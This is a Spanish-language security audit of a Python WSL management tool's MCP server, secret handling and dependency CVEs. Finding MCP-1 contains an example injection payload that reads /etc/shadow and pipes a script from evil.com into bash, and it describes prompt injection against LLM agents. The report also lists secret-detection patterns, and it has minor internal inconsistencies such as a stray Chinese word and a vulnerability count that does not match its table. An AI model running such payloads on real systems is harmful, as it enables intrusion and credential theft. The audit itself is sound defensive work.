# Auditoría de Seguridad — MCP Server, Secretos/Git y CVEs
## wsl-manager-gui v0.1.0

- **Fecha:** 2026-08-15
- **Auditor:** SAST + revisión manual de código
- **Alcance:** `src/mcp/`, `src/providers/`, `src/api/`, `src/web/`, `config/`, `pyproject.toml`, `.gitignore`
- **Python:** 3.11.9 (MSC v.1938 64-bit)
- **Bandit:** 7 LOW, 0 HIGH/MEDIUM (reporte existente en `bandit-report.json`)

---

## PARTE 1: MCP Server Security

### 1.1 Arquitectura MCP

El MCP server (`src/mcp/server.py`) expone 15 tools vía stdio o HTTP (streamable). Las tools son delegadas a `McpTools` (`src/mcp/tools.py`) que llama métodos del `WslProvider` y otros providers.

**Flujo de datos:**
```
MCP client → McpTools.call(name, args) → tool_<name>(**args) → WslProvider → subprocess_async.run([...])
```

### 1.2 Hallazgos MCP

---

#### MCP-1: Command Injection en `run_command` (HIGH)

- **CWE-78 (OS Command Injection) · OWASP A03 (Injection) · MITRE T1059**
- **Ubicación:** `src/mcp/tools.py:126-128` → `src/providers/wsl_provider.py:174-175`
- **Descripción:** La tool MCP `run_command` acepta un parámetro `cmd` de entrada arbitraria y lo ejecuta directamente dentro de la distro WSL sin sanitización:
  ```python
  # tools.py:126-128
  def tool_run_command(self, distro: str, cmd: str) -> dict:
      r = self.ctx.wsl.run_command(distro, cmd)
      return {"ok": r.ok, "output": r.output, "error": r.error or None}

  # wsl_provider.py:174-175
  def run_command(self, name: str, cmd: str) -> CommandResult:
      return self._wsl_d(name, ["--", "sh", "-lc", cmd], timeout=300)
  ```
  Aunque el cmd se pasa como un **elemento de lista** (no `shell=True`), el `sh -lc` invocado dentro de la distro interpreta el string como un comando de shell. Un atacante MCP puede inyectar comandos arbitrarios:
  ```json
  {"name": "run_command", "arguments": {"distro": "ubuntu", "cmd": "cat /etc/shadow; curl http://evil.com/shell.sh | bash"}}
  ```
- **Impacto:** Ejecución remota de código (RCE) dentro de la distro WSL con los privilegios del usuario WSL. Un agente MCP malicioso o un prompt injection en un agente LLM podría explotar esto.
- **Severidad:** HIGH — explotable desde cualquier cliente MCP conectado
- **Remediación:**
  1. **Corto plazo:** Lista de comandos permitidos (allowlist) o validación de que `cmd` no contenga shell metacharacters (`;`, `|`, `&&`, `||`, `$(`, `` ` ``, `>`, `<`).
  2. **Medio plazo:** Registrar esta tool como de alto riesgo, añadir logging detallado de cada ejecución, y considerar una mode "restrict" que solo permita comandos de la allowlist.
  3. **Alternativa:** Usar `sh -c` con argumentos separados en lugar de un solo string concatenado.

---

#### MCP-2: Sin autenticación/autorización en MCP (MEDIUM)

- **CWE-306 (Missing Authentication) · OWASP A01 (Broken Access Control)**
- **Ubicación:** `src/mcp/server.py:7-31` (stdio) y `src/mcp/server.py:34-57` (HTTP)
- **Descripción:** El parámetro `mcp.token_required` existe en la configuración (`config.py:177`, `config.example.json:74`) pero **NUNCA se valida** en el código del servidor MCP:
  ```python
  # server.py - No hay verificación de token_required
  def run_stdio(ctx: CliContext) -> None:
      ...
      mcp = FastMCP("wsl-manager")
      # Aquí debería verificarse ctx.config.mcp.token_required
      mcp.run(transport="stdio")
  ```
  Búsqueda de `token_required` en `src/mcp/`: **0 resultados**.
- **Impacto:** Cualquier cliente MCP conectado puede ejecutar todas las tools (incluyendo `run_command`, `shutdown_all`) sin autenticación. En transporte HTTP, esto es particularmente peligroso.
- **Severidad:** MEDIUM (depende del transporte: stdio es local, HTTP puede ser remoto)
- **Remediación:** Implementar verificación de token en `run_stdio()` y `create_http_app()` cuando `token_required` esté activo, o eliminar el flag si no se planea implementar.

---

#### MCP-3: Input validation deficiente en parámetros de tools (MEDIUM)

- **CWE-20 (Improper Input Validation) · OWASP A03**
- **Ubicación:** `src/mcp/tools.py:39-50`
- **Descripción:** El dispatcher `call()` usa `**args` sin validación de tipos o rangos:
  ```python
  def call(self, name: str, arguments: dict | None = None) -> dict:
      args = arguments or {}
      fn = getattr(self, f"tool_{name}", None)
      if fn is None:
          return {"error": f"tool desconocida: {name}"}
      try:
          return fn(**args)  # ← kwargs sin validación
      except TypeError as e:
          return {"error": f"argumentos invalidos: {e}"}
  ```
  Problemas específicos:
  - **`tool_set_global_limits`**: Sin validación de rangos para `memory_gb`, `processors`, `swap_gb`. Un valor negativo o extremadamente grande podría corromper `.wslconfig`.
  - **`tool_schedule_add`**: El parámetro `type` se pasa directamente a `ScheduleAction(type=type)` pero la validación Pydantic solo acepta `Literal["distro_start", "distro_stop", "apply_profile", "snapshot"]` — esto es correcto pero el error se devuelve como string genérico.
  - **`tool_clone`**: `new_name` no se valida — podría contener caracteres problemáticos para WSL.
  - **`tool_run_command`**: Sin límite de longitud del `cmd`.
- **Remediación:** Añadir validación explícita de parámetros en cada tool (rangos, longitudes, regex para nombres de distro).

---

#### MCP-4: Sin límites de ejecución en tools (LOW)

- **CWE-770 (Allocation without Limits)**
- **Ubicación:** `src/mcp/tools.py` + `src/providers/wsl_provider.py`
- **Descripción:** Aunque `subprocess_async.run()` tiene un timeout por defecto de 120s, la tool `run_command` usa 300s (5 minutos) y `export`/`snapshot` usan 600s (10 minutos). No hay un timeout global del MCP server ni límite de concurrencia de peticiones.
- **Impacto:** Un cliente MCP podría发起 múltiples llamadas concurrentes a `run_command` o `snapshot` agotando recursos.
- **Remediación:** Añadir semáforo de concurrencia y timeout global en el dispatcher MCP.

---

#### MCP-5: `shell=True` NO utilizado (CONTROL POSITIVO)

- **Verificación:** `subprocess_async.py:13` usa `subprocess.run(args, ...)` con `args` como lista. **No hay `shell=True`** en ningún lugar del código fuente.
- **Resultado:** CORRECTO — la ejecución pasa por `sh -lc` dentro de WSL, no por el shell de Windows.

---

#### MCP-6: `getattr` dinámico para dispatch (LOW)

- **CWE-470 (Dynamic Code)**
- **Ubicación:** `src/mcp/tools.py:42`
- **Descripción:** `getattr(self, f"tool_{name}", None)` permite invocar cualquier método que empiece con `tool_`. Aunque solo hay tools documentadas, un nombre malicioso podría invocar métodos internos como `tool__quote` si existieran.
- **Impacto:** Bajo — los métodos del prefix `tool_` son seguros actualmente.
- **Remediación:** Usar un diccionario explícito de tools en lugar de `getattr` dinámico:
  ```python
  TOOL_MAP = {"list_distros": tool_list_distros, "start": tool_start, ...}
  ```

---

#### MCP-7: Path traversal en `tool_snapshot` (LOW - mitigado)

- **CWE-22 (Path Traversal)**
- **Ubicación:** `src/mcp/tools.py:81-88` → `src/providers/wsl_provider.py:136-145`
- **Descripción:** `tool_snapshot` usa `self.ctx.config.snapshots.target_dir` configurado, no un parámetro de entrada del cliente MCP. La ruta se construye internamente con `base / f"snapshot-{name}-{stamp}.tar"`. El `name` proviene del parámetro `distro` del cliente.
- **Impacto:** El nombre de distro podría contener `../` pero se usa como parte del nombre de archivo en `snapshot_dir()`. Windows normaliza rutas, y el `name` se pasa a `wsl -d <name>` que rechazaría nombres inválidos.
- **Severidad:** LOW (mitigada por el substrate WSL)
- **Remediación:** Validar que `distro` matchee `^[a-zA-Z0-9._-]+$`.

---

#### MCP-8: Acceso a datos sensibles sin control (LOW)

- **CWE-200 (Information Exposure)**
- **Ubicación:** `src/mcp/tools.py:130-140` (`tool_doctor`)
- **Descripción:** `tool_doctor` retorna la versión de WSL y diagnósticos del sistema. `tool_list_distros` retorna IPs internas. `tool_get_metrics` retorna uso de RAM/CPU.
- **Impacto:** Información que un agente MCP malicioso podría usar para reconología.
- **Remediación:** Asegurar que el MCP solo se exponga a clientes confiables (stdio es seguro por diseño; HTTP requiere autenticación).

---

### 1.3 Resumen Severidades MCP

| ID | Hallazgo | Severidad | CWE | Estado |
|----|----------|-----------|-----|--------|
| MCP-1 | Command injection en `run_command` | **HIGH** | CWE-78 | Abierto |
| MCP-2 | Sin auth en MCP server | **MEDIUM** | CWE-306 | Abierto (previamente reportado como M3) |
| MCP-3 | Input validation deficiente | **MEDIUM** | CWE-20 | Abierto |
| MCP-4 | Sin límites de ejecución | **LOW** | CWE-770 | Abierto |
| MCP-5 | shell=True NO utilizado | OK | — | Control positivo |
| MCP-6 | getattr dinámico para dispatch | **LOW** | CWE-470 | Abierto |
| MCP-7 | Path traversal en snapshot | **LOW** | CWE-22 | Mitigado |
| MCP-8 | Info leakage en doctor/metrics | **LOW** | CWE-200 | Aceptado |

---

## PARTE 2: Git y Secretos

### 2.1 Estado de Git

| Verificación | Resultado |
|---|---|
| Directorio `.git` | **NO EXISTE** — El proyecto no tiene repositorio Git inicializado |
| `.gitignore` | **NO EXISTE** en la raíz del proyecto (solo `.pytest_cache/.gitignore` auto-generado) |
| Historia con secretos | N/A — sin repositorio |

### 2.2 Archivos sensibles en el reposystem

| Patrón buscado | Resultado |
|---|---|
| `.env`, `.env.*` | Ninguno encontrado |
| `*.key`, `*.pem` (proyecto) | Ninguno (los `.pem` son de `.venv/certifi` — normales) |
| `credentials*` | Ninguno |
| `secrets*` | Solo `.venv/pydantic_settings` — dependencia, no del proyecto |
| `*.p12`, `*.pfx`, `*.jks` | Ninguno |

### 2.3 Hardcoded secrets en código

| Patrón buscado | Resultado |
|---|---|
| `password=` / `secret=` / `api_key=` con valores | **Ninguno encontrado** |
| `AKIA` / `sk_live` / `pk_live` / `ghp_` | **Ninguno** |
| `BEGIN.*PRIVATE` | **Ninguno** |
| `eyJ` (JWT) | **Ninguno** |
| Connection strings con credenciales | **Ninguno** |

### 2.4 Configuración y permisos

| Verificación | Resultado |
|---|---|
| `config/config.example.json` | Seguro — solo muestra estructura, sin valores sensibles. `auth.mode: "none"` y `token_required: false` son defaults documentados |
| `mcp.token_required` | Flag decorativo (no implementado) — ver MCP-2 |
| Permisos de archivos | Windows ACLs — no verificable desde Python de forma fiable; el `.venv` tiene permisos estándar |

### 2.5 Hashing de tokens (previamente reportado)

- `sha256(token)` sin salt en `src/api/auth.py:47` y `src/cli/commands_ux.py:337`
- Tokens generados con `secrets.token_urlsafe(32)` (256 bits de entropía)
- **Riesgo:** Bajo (256 bits es inviable para diccionario), pero `pbkdf2_hmac` sería más robusto

### 2.6 Resumen Git/Secretos

| ID | Hallazgo | Severidad | CWE |
|----|----------|-----------|-----|
| G-1 | Sin `.gitignore` — riesgo de commitear secretos futuros | **MEDIUM** | CWE-538 |
| G-2 | Sin repositorio Git — sin auditoría de historia posible | **INFO** | — |
| G-3 | `sha256` sin salt para tokens | **LOW** | CWE-760 |
| G-4 | `config.example.json` con `token_required: false` | **INFO** | — |

---

## PARTE 3: Dependencias y CVEs

### 3.1 Dependencias del proyecto

**Core (pyproject.toml):**
```
ttkbootstrap>=1.10, pystray>=0.19, Pillow>=10, psutil>=5.9,
pydantic>=2.6, pyyaml>=6.0, typer>=0.12, winotify>=1.1
```

**Optional — API:**
```
fastapi>=0.110, uvicorn>=0.29, httpx>=0.27, pydantic-settings>=2.2
```

**Optional — MCP:**
```
mcp>=1.0
```

### 3.2 CVEs encontrados (pip-audit)

| Paquete | Versión | CVE | Severidad | Fix | Descripción |
|---------|---------|-----|-----------|-----|-------------|
| setuptools | 65.5.0 | PYSEC-2022-43012 | **Medium** | 65.5.1 | ReDoS en package_index (DoS remoto) |
| setuptools | 65.5.0 | PYSEC-2025-49 | **High** | 78.1.1 | Path traversal en PackageIndex → escritura arbitraria en filesystem (RCE potencial) |
| setuptools | 65.5.0 | PYSEC-2026-1918 | **High** | 70.0.0 | Remote Code Execution via download functions en package_index |
| setuptools | 65.5.0 | PYSEC-2026-3447 | **Low** | 83.0.0 | Bypass de MANIFEST.in en macOS (NFC/NFD) → publicación accidental de archivos excluidos |

**Total: 7 vulnerabilidades en 1 paquete (setuptools 65.5.0)**

### 3.3 Análisis de riesgo de CVEs

| CVE | Riesgo real para este proyecto |
|-----|-------------------------------|
| PYSEC-2022-43012 (ReDoS) | **Bajo** — afecta `package_index` durante `pip install` con paquetes maliciosos; no afecta la app en runtime |
| PYSEC-2025-49 (Path traversal) | **Bajo** — `easy_install` y `package_index` están deprecated; requiere instalación de paquetes maliciosos |
| PYSEC-2026-1918 (RCE) | **Bajo** — requiere que la app exponga funciones de download con URLs de usuario; este proyecto no lo hace |
| PYSEC-2026-3447 (MANIFEST) | **Informativo** — solo afecta macOS APFS al construir sdist; irrelevante en Windows |

**Nota:** `setuptools` es una dependencia de build (`requires = ["setuptools>=68"]`) y no se ejecuta en runtime. El riesgo es: (1) durante `pip install -e .` en desarrollo, y (2) si el proyecto se publica como paquete PyPI. **No afecta a usuarios finales de la app.**

### 3.4 Dependencias deprecated o sin mantener

| Dependencia | Estado |
|---|---|
| `ttkbootstrap` | Activo, último release reciente |
| `pystray` | Activo |
| `Pillow` | Muy activo |
| `psutil` | Activo |
| `pydantic` | Muy activo |
| `pyyaml` | Activo |
| `typer` | Activo |
| `winotify` | Baja actividad (último release 2022) — **posiblemente sin mantener** |
| `fastapi` | Muy activo |
| `uvicorn` | Muy activo |
| `httpx` | Activo |
| `mcp` | Activo (nuevo ecosistema) |

### 3.5 Python runtime

- **Versión:** 3.11.9 (abril 2024) — patches de seguridad disponibles (3.11.x sigue activo)
- **Riesgo:** Python 3.11 está en fase de bugfix/security; considerar actualizar a 3.12+ para soporte a largo plazo

---

## Resumen Ejecutivo

| Categoría | Critical | High | Medium | Low | Info |
|-----------|----------|------|--------|-----|------|
| MCP Server | 0 | 1 | 2 | 4 | 0 |
| Git/Secretos | 0 | 0 | 1 | 1 | 2 |
| Dependencias | 0 | 0* | 0* | 0 | 1 |
| **Total** | **0** | **1** | **3** | **5** | **3** |

*Los CVEs de setuptools son de build-dependency, no runtime.

### Top Recomendaciones (prioridad)

1. **(HIGH MCP-1)** Implementar validación/allowlist para `run_command` — la tool más peligrosa del MCP server.
2. **(MEDIUM MCP-2)** Implementar o eliminar `mcp.token_required` — el flag es engañoso.
3. **(MEDIUM MCP-3)** Añadir validación de parámetros con rangos/longitudes en todas las tools MCP.
4. **(MEDIUM G-1)** Crear `.gitignore` completo antes de inicializar Git.
5. **(LOW)** Actualizar `setuptools` a `>=83.0.0` en el build system.
6. **(INFO)** Evaluar reemplazo de `winotify` si se necesita mantenimiento activo.
7. **(INFO)** Evaluar actualización a Python 3.12+.
